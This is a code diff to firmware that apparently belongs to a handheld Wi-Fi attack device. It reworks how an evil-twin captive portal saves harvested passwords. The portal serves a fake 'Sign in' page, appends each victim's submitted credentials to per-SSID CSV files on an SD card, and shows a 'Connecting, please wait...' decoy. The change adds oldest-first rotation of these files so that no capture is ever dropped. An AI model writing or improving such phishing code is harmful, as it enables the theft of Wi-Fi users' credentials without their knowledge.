@@ -1584,7 +1584,7 @@ void tickHandshake() {
 constexpr size_t PORTAL_PAGE_MAX = 24576;
 constexpr char PORTAL_TEMPLATE_DIR[] = "/PortalTemplates";
 constexpr char PORTAL_CREDS_DIR[] = "/BruceEvilCreds";
-constexpr int PORTAL_CREDS_FILE_MAX = 50;  // rotation stops here (50 files x 200 lines)
+constexpr int PORTAL_CREDS_FILE_MAX = 50;  // files kept per SSID (x 200 lines); oldest deleted when full
 const char *const PORTAL_DEFAULT_PAGE = R"HTML(<!DOCTYPE html>
 <html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in</title></head>
 <body style="font-family:sans-serif;max-width:340px;margin:40px auto;padding:0 16px">
@@ -1722,7 +1722,35 @@ void appendCapped(const char *path, const String &line) {
     }
 }
 
-bool portalCredsPath(char *out, size_t n) {
+// Path of the k-th creds file for an SSID: <safe>_creds.csv, then <safe>_creds_2.csv, and so on.
+void portalCredsFile(char *out, size_t n, const char *safe, int k) {
+    if (k == 1) {
+        snprintf(out, n, "%s/%s_creds.csv", PORTAL_CREDS_DIR, safe);
+    } else {
+        snprintf(out, n, "%s/%s_creds_%d.csv", PORTAL_CREDS_DIR, safe, k);
+    }
+}
+
+// First in, first out: delete file 1 (the oldest), then move every file down one number.
+// That frees the newest slot, PORTAL_CREDS_FILE_MAX, for the next capture.
+void rotatePortalCreds(const char *safe) {
+    char from[96];
+    char to[96];
+    portalCredsFile(to, sizeof(to), safe, 1);
+    if (SD.exists(to)) SD.remove(to);
+    for (int k = 2; k <= PORTAL_CREDS_FILE_MAX; k++) {
+        portalCredsFile(from, sizeof(from), safe, k);
+        portalCredsFile(to, sizeof(to), safe, k - 1);
+        if (SD.exists(from)) {
+            if (SD.exists(to)) SD.remove(to);
+            SD.rename(from, to);
+        }
+    }
+}
+
+// Picks the file the next capture goes to. When all files are full, the oldest is deleted
+// first, so the newest capture is always saved.
+void portalCredsPath(char *out, size_t n) {
     char safe[SPAM_SSID_MAX + 1];
     size_t j = 0;
     for (size_t i = 0; deauthSsid[i] != '\0' && j < SPAM_SSID_MAX; i++) {
@@ -1731,14 +1759,11 @@ bool portalCredsPath(char *out, size_t n) {
     }
     safe[j] = '\0';
     for (int k = 1; k <= PORTAL_CREDS_FILE_MAX; k++) {
-        if (k == 1) {
-            snprintf(out, n, "%s/%s_creds.csv", PORTAL_CREDS_DIR, safe);
-        } else {
-            snprintf(out, n, "%s/%s_creds_%d.csv", PORTAL_CREDS_DIR, safe, k);
-        }
-        if (!SD.exists(out) || countLines(out) < LOG_MAX_ENTRIES) return true;
+        portalCredsFile(out, n, safe, k);
+        if (!SD.exists(out) || countLines(out) < LOG_MAX_ENTRIES) return;
     }
-    return false;  // every creds file is full: caller reports it instead of dropping silently
+    rotatePortalCreds(safe);
+    portalCredsFile(out, n, safe, PORTAL_CREDS_FILE_MAX);
 }
 
 void portalHandlePost() {
@@ -1758,18 +1783,15 @@ void portalHandlePost() {
     }
     if (!SD.exists(PORTAL_CREDS_DIR)) SD.mkdir(PORTAL_CREDS_DIR);
     char path[96];
-    if (portalCredsPath(path, sizeof(path))) {
-        File f = SD.open(path, FILE_APPEND);
-        if (f) {
-            f.println(line);
-            f.close();
-        }
-        snprintf(portalCredsName, sizeof(portalCredsName), "%s", path);
-        portalCaptured++;
-        snprintf(portalLast, sizeof(portalLast), "%s", lastVal.c_str());
-    } else {
-        snprintf(portalLast, sizeof(portalLast), "%s", "creds full: not saved");
+    portalCredsPath(path, sizeof(path));
+    File f = SD.open(path, FILE_APPEND);
+    if (f) {
+        f.println(line);
+        f.close();
     }
+    snprintf(portalCredsName, sizeof(portalCredsName), "%s", path);
+    portalCaptured++;
+    snprintf(portalLast, sizeof(portalLast), "%s", lastVal.c_str());
     portalServer.send(200, "text/html", "<html><body style=\"font-family:sans-serif\"><p>Connecting, please wait...</p></body></html>");
 }
 
